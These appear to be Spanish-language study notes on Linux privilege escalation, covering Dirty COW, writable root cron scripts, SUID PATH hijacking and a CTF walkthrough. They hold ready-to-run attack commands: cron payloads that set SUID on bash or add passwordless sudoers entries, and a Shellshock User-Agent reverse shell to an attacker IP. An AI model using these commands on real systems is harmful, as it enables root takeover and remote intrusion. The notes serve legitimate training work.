----
# LINUX KERNEL EXPLOITS

## ¿QUÉ ES EL KERNEL DE LINUX?

El **kernel de Linux** es el **núcleo del sistema operativo**.  
Se encarga de:

- gestión de memoria
- gestión de procesos
- control del hardware
- control de permisos (UID / GID)
- comunicación entre software y hardware

👉 Si comprometes el kernel:
> **controlas todo el sistema** (root).
## KERNEL EXPLOITATION EN LINUX

La explotación del kernel en Linux **depende de**:
- versión exacta del kernel
- distribución (Ubuntu, Debian, CentOS…)
- arquitectura (x86 / x64)
- parches aplicados

## METODOLOGÍA TÍPICA DE ESCALADA DE PRIVILEGIOS (LINUX)

1. **Identificar versión del kernel**
2. **Buscar vulnerabilidades conocidas**
3. **Seleccionar exploit compatible**
4. **Transferir el exploit al sistema**
5. **Compilar (si es necesario)**
6. **Ejecutar y obtener root**
    
## HERRAMIENTAS

### 🔹 linux-exploit-suggester (LES)

- Detecta vulnerabilidades del kernel
- Sugiere exploits conocidos
- Indica probabilidad de éxito

Repositorio:

`https://github.com/mzet-/linux-exploit-suggester`

## ENUMERACIÓN DESDE METERPRETER

### 1️⃣ Identificar sistema y kernel

`sysinfo`

Ejemplo:

`Linux 3.2.0-23-generic`

### 2️⃣ Subir linux-exploit-suggester

En tu máquina atacante:
`wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh`

En Meterpreter:

`cd /tmp `
`upload linux-exploit-suggester.sh shell /bin/bash -i chmod +x linux-exploit-suggester.sh ./linux-exploit-suggester.sh`
## INTERPRETAR LA SALIDA DE LES

- **Exposure**  
    → probabilidad de que el exploit funcione
    
- **Tags**  
    → condiciones necesarias:
    - versión de kernel
    - arquitectura
    - parches
    - distro

👉 **No ejecutes exploits al azar**, fíjate en los tags.

## EJEMPLO: DIRTY COW (CVE-2016-5195)

### ¿QUÉ ES DIRTY COW?

- Vulnerabilidad en el kernel de Linux
- Condición de carrera (race condition)
- Permite **escalar privilegios a root**
- Muy común en kernels antiguos
### DESCARGA DEL EXPLOIT

Desde Exploit-DB:
- buscar **Dirty COW**
- descargar el código fuente (`.c`)
### TRANSFERIR EL EXPLOIT

Desde Meterpreter:

`upload ~/Downloads/dirty.c`

O usando HTTP:

`python3 -m http.server 80`

En la víctima:

`wget http://IP_ATACANTE/dirty.c`

## COMPILACIÓN DEL EXPLOIT

Si la víctima tiene `gcc`:

`gcc -pthread dirty.c -o dirty -lcrypt`

📌 Si **NO tiene gcc**: sudo apt-get install gcc

- compilar en tu máquina
- subir el binario
- puede fallar por incompatibilidad (glibc)

## EJECUCIÓN DEL EXPLOIT

`chmod +x dirty ./dirty newpassword`

Esto:

- modifica `/etc/passwd`
- establece contraseña root

## ACCESO COMO ROOT

Si el exploit no funciona bien desde Meterpreter:

`ssh firefart@IP` -> pass

----

# EXPLOITING MISCONFIGURED CRON JOBS

## ¿QUÉ ES CRON?

**cron** es un **servicio de Linux basado en tiempo** que ejecuta:

- scripts
- binarios
- comandos

👉 de forma **automática y periódica** (cada minuto, hora, día, etc.).

Ejemplos de uso legítimo:

- backups
- limpieza de logs
- tareas de mantenimiento
- scripts de monitorización
## ¿QUÉ ES UN CRON JOB?

Un **cron job** es una **tarea programada** que se ejecuta según una regla de tiempo.

Ejemplo:

`* * * * * /usr/local/bin/backup.sh`

👉 Esto ejecuta `backup.sh` **cada minuto**.
## ¿QUÉ ES EL CRONTAB?

El **crontab** es el archivo donde se definen los cron jobs.

Tipos importantes:

- crontab de usuario    
- crontab de **root**
- scripts en:
    - `/etc/crontab`
    - `/etc/cron.d/`
    - `/etc/cron.hourly/`
    - `/etc/cron.daily/`
## ¿POR QUÉ LOS CRON JOBS SON INTERESANTES PARA PRIVES C?

🔑 Idea clave:

> **Si un cron job se ejecuta como root  
> y tú puedes modificar lo que ejecuta → eres root.**

## METODOLOGÍA DE EXPLOTACIÓN

### 1️⃣ Buscar cron jobs

`crontab -l`

(Si eres root verás los de root, si no, solo los tuyos)

También mirar:
`cat /etc/crontab ls -la /etc/cron.*`

### 2️⃣ Identificar cron jobs ejecutados como root

Busca líneas tipo:

`* * * * * root /usr/local/share/copy.sh`

👉 Importante:

- **usuario root**
- script o binario externo
### 3️⃣ Comprobar permisos del script

`ls -la /usr/local/share/copy.sh`

Si ves algo como:

`-rwxrwxrwx`

o

`-rwxrwxr-x`

y tú eres owner o grupo → **vulnerable**.

## FORMAS DE EXPLOTARLO
## OPCIÓN 1️⃣ – SUID BASH (LA MÁS CLÁSICA)

Si puedes editar el script del cron:

`printf '#!/bin/bash\nchmod u+s /bin/bash\n' > /usr/local/share/copy.sh`

Cuando el cron se ejecute (como root):

- `/bin/bash` tendrá el bit SUID

Luego:

`/bin/bash -p`

🎯 **Root shell**
## OPCIÓN 2️⃣ – AÑADIR USUARIO A SUDOERS (SIN PASSWORD)

Si no tienes editor (nano/vi):
`printf '#!/bin/bash\necho "user ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers\n' > /usr/local/share/copy.sh`

Cuando cron se ejecute:
`sudo su`

---
# EXPLOITING SUID BINARIES (EXPLICADO BIEN)

## 1️⃣ ¿QUÉ SON LOS PERMISOS SUID Y SGID?

En Linux, cada archivo tiene permisos:

- **usuario (owner)**
- **grupo**
- **otros**

Normalmente:

- un programa se ejecuta **con tus permisos**
- aunque sea de root
## 🔴 SUID (Set User ID)

El bit **SUID** hace que:

> **el programa se ejecute con los privilegios del propietario del archivo**,  
> no con los del usuario que lo lanza.

Ejemplo:

- binario propiedad de **root**
- tiene SUID
- tú lo ejecutas como usuario normal

👉 **el programa corre como root**
## 🔵 SGID (Set Group ID)

El bit **SGID** hace que:

> el programa se ejecute con los privilegios del **grupo propietario**

Se usa menos para privesc, más para acceso a recursos compartidos.

## 📌 EJEMPLO VISUAL DE PERMISOS

`ls -l /usr/bin/passwd`

Salida típica:

`-rwsr-xr-x 1 root root 54256 passwd`

Fíjate en:

`rws`

La **s** en vez de **x** → **SUID activo**

## 2️⃣ ¿POR QUÉ ES PELIGROSO EL SUID?

Porque:

- cualquier fallo en el programa
- cualquier mala práctica
- cualquier ejecución de comandos externos

👉 se ejecuta **como root**

## 3️⃣ BUSCAR BINARIOS SUID (PASO 1 SIEMPRE)

`find / -perm -4000 2>/dev/null`

Esto lista:

- **todos los binarios con SUID**
- normalmente propiedad de root

## 4️⃣ QUÉ BUSCAR EN LOS BINARIOS SUID

No todos son vulnerables. Buscamos:

### 🔹 Binarios raros

- scripts custom
- nombres no estándar
- ubicaciones raras (`/usr/local/bin`, `/opt`)
### 🔹 Binarios que:

- ejecutan otros comandos
- usan rutas relativas
- llaman a `system()`
- usan `bash`, `sh`, `cp`, `rm`, etc.
## 5️⃣ CASO TÍPICO: SCRIPT SUID MAL HECHO

Imagina que encuentras esto:

`-rwsr-xr-x 1 root root script`

Y al hacer:

`strings script` -> busca cadenas de caracteres imprimibles

Ves algo como:

`#!/bin/bash greetings`

💡 **Aquí está la clave**.

## 6️⃣ ¿QUÉ SIGNIFICA ESO?

El script:

- se ejecuta como **root** (porque es SUID)
- llama a un binario llamado `greetings`
- **SIN ruta absoluta**

👉 Linux busca `greetings` en el **PATH**

## 7️⃣ EXPLOTACIÓN PASO A PASO (AQUÍ HACE CLICK)

### 1️⃣ Comprobamos el PATH

`echo $PATH`

Ejemplo:

`/home/user:/usr/local/bin:/usr/bin:/bin`
### 2️⃣ ¿Podemos escribir en alguno de esos directorios?

Ejemplo:

`cd /home/user`

Sí → perfecto.
### 3️⃣ Creamos un binario malicioso llamado `greetings`

`rm greetings cp /bin/bash greetings chmod +x greetings`

👉 Ahora `greetings` **es una bash**

### 4️⃣ Ejecutamos el script SUID

`./script`

Lo que pasa realmente es:

- el script corre como root
- ejecuta `greetings`
- pero `greetings` es **tu bash**
- se ejecuta **como root**

### 5️⃣ MANTENER PRIVILEGIOS ROOT

`./greetings -p`

o directamente:

`bash -p`

🎯 **Root shell conseguido**

---
# CTF – WALKTHROUGH

## 🏁 FLAG 1 – CGI + Shellshock (RCE)

### Enumeración

`nmap -p- IP`

- Se detecta **puerto 80**
- Al inspeccionar la web ctrl +shift + c -> network -> se observa un **script CGI**
### Explotación (Shellshock)

En **Burp Suite** (o con curl), modificar el **User-Agent**:

`() { :; }; /bin/bash -c "comando"`

Ejemplo (reverse shell):

`() { :; }; /bin/bash -c "bash -i >& /dev/tcp/IP_ATACANTE/4444 0>&1"`

👉 Resultado: **RCE → reverse shell**

---

## 🏁 FLAG 2 – Flag oculta en web root

Una vez dentro del sistema:

`cd /opt/apache/htdocs ls -la`

Se encuentra un archivo oculto:

`cat .flag.txt`

🎯 **Flag obtenida**

---

## 🏁 FLAG 3 – SSH vulnerable (libssh auth bypass)

### Enumeración

`nmap -p 22 IP nmap -sCV -p 22 IP`

- Se detecta **libssh vulnerable**
### Explotación con Metasploit

`msfconsole search libssh use auxiliary/scanner/ssh/libssh_auth_bypass`
`set RHOSTS IP`
`set SPAWN_PTY true run`

Acceder a la sesión:

`sessions sessions <id>`

Buscar la flag:

`cd /home/user cat flag.txt`

🎯 **Flag obtenida**

---

## 🏁 FLAG 4 – Escalada de privilegios con SUID

### Enumeración

`cd /home/user ls -l`

Se encuentra un binario **SUID**:

`-rwsr-xr-x welcome`
### Análisis

`strings welcome`

Se observa que ejecuta:

`greetings`

👉 **Sin ruta absoluta → vulnerable a PATH hijacking**
### Explotación

`rm greetings cp /bin/bash greetings chmod +x greetings`

Ejecutar:

`./greetings`

O directamente:

`bash -p`

🎯 **Shell como root → flag final**



